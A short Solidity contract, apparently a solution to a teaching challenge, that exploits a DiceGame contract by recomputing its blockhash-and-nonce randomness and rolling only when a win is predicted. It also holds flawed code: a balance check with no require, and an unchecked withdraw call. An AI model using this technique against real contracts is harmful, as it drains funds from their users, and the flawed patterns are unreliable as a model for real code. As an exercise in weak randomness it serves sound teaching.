pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import 'hardhat/console.sol';
import './DiceGame.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract RiggedRoll is Ownable {
  DiceGame public diceGame;
  uint256 public rolled;

  constructor(address payable diceGameAddress) {
    diceGame = DiceGame(diceGameAddress);
  }

  //Add withdraw function to transfer ether from the rigged contract to an address
  function withdraw(uint256 amount) public payable onlyOwner {
    (bool success, ) = payable(msg.sender).call{value: amount}('');
  }

  //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
  function riggedRoll() public payable returns (uint256) {
    address(this).balance >= 0.002 ether;
    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
    uint256 roll = uint256(hash) % 16;

    //2000000000000000
    console.log('The Roll is', roll);

    if (roll <= 2) {
      diceGame.rollTheDice{value: 0.002 ether}();
    } else {
      revert('Wrong Roll Guess');
    }

    return rolled = roll;
    // console.log(roll);
  }

  //Add receive() function so contract can receive Eth
  receive() external payable {}
}
